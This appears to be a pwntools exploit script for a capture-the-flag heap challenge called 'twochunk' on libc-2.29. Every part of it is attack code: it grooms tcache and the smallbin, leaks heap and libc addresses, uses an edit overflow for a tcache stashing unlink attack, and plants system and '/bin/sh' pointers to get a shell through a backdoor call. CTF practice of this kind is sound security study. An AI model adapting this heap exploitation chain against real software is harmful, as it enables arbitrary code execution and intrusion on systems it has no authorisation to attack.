from pwn import *
filename="./twochunk"
libc_name="./libc-2.29.so"
io = process(filename)
context.log_level='debug'
elf=ELF(filename)
libc=ELF(libc_name)
context.terminal=['tmux','split','-hp','60']

def add(index,size):
    io.recvuntil('choice:')
    io.sendline(str(1))
    io.recvuntil('idx:')
    io.sendline(str(index))
    io.recvuntil('size:')
    io.sendline(str(size))

def free(index):
    io.recvuntil('choice:')
    io.sendline(str(2))
    io.recvuntil('idx:')
    io.sendline(str(index))

def show(index):
    io.recvuntil('choice:')
    io.sendline(str(3))
    io.recvuntil('idx:')
    io.sendline(str(index))

def edit(index,content):
    io.recvuntil('choice')
    io.sendline(str(4))
    io.recvuntil('idx:')
    io.sendline(str(index))
    io.recvuntil('content:')
    io.sendline(content)

def malloc(content):
    io.recvuntil('choice')
    io.sendline(str(6))
    io.recvuntil('leave your end message:')
    io.sendline(content)

def backdoor():
    io.recvuntil('choice')
    io.sendline(str(7))

def message():
    io.recvuntil('choice')
    io.sendline(str(5))
    

def debug():
    cmd = ""
    cmd+="brva 0x151C\n"
    gdb.attach(io,cmd)
    show(0)

io.recvuntil('leave your name:')
io.send(p64(0x23333020)*6)
io.recvuntil("leave your message:")
io.send(p64(0x23333020)*8) # make it writable



# first prepare 0x90 chunk in tcache 
for i in range(0,5):
    add(0,0x88)
    free(0)


# aim is to create(0x88)*2, puts into smallbin
# add size limit(0x88,0x3ff) add(0x23333) means malloc(0xe9)
for i in range(0,7):
    add(0,0x198)
    free(0)
add(0,0x198)
add(1,0x200) # avoid consolidate
free(0) #0x188 into unsortedbin
add(0,0x108)
free(0)
add(0,0xa8) #put into smallbin
free(0)
free(1) #consolidate
# debug()
add(0,0xe9)
add(1,0xe9)
free(0)
free(1)
add(0,23333) # leak heap_addr using tcache
show(0)
heap_info = u64(io.recvuntil(b'\x55')[-6:].ljust(8,b"\x00"))
success("heap_info: " + hex(heap_info))
heap_base = heap_info - 5360
success("heap_base: " + hex(heap_base))
free(0)
# debug()



for i in range(0,6):
    add(1,0x190)
    free(1)
add(1,0x190)
add(0,0x210) #avoid consolidate
free(1)
free(0)

add(1,0x108) 
# debug()
# free(1)
add(0,0xb8) #put into smallbin
# [smallbin] 0x90: 0x56248bc6ef70 —▸ 0x56248bc6de40 —▸ 0x7f02119a4d20 (main_arena+224) ◂— 0x56248bc6ef70
free(0) # no-use
# now ptr1's next is vuln 0x90 in smallbin
# debug()




# use edit's overflow to leak
payload1 = b"a"*0x100+p64(0)+p64(0x91)+p64(heap_base+0x001190)+p64(0x23333000 - 0x10)
edit(1,payload1)
# gdb.attach(io,"brva 0x12D2") # break add
add(0,0x88) # trigger tcache stashing unlink attack
# gdb.attach(io,"brva 0x169B")
message()
libc_info = u64(io.recvuntil('\x7f')[-6:].ljust(8,b"\x00"))
success("libc_info: " + hex(libc_info))
libc_base = libc_info-0x1e4d20
success("libc_base: " + hex(libc_base))

# gdb.attach(io,"brva 0x1701")
# malloc back malicious chunk
malloc(p64(libc_base+libc.symbols['system'])+p64(0)*5+p64(libc_base+libc.search(b"/bin/sh\x00").__next__())+p64(0)*2)
# gdb.attach(io,"brva 0x1766")
backdoor()




io.interactive()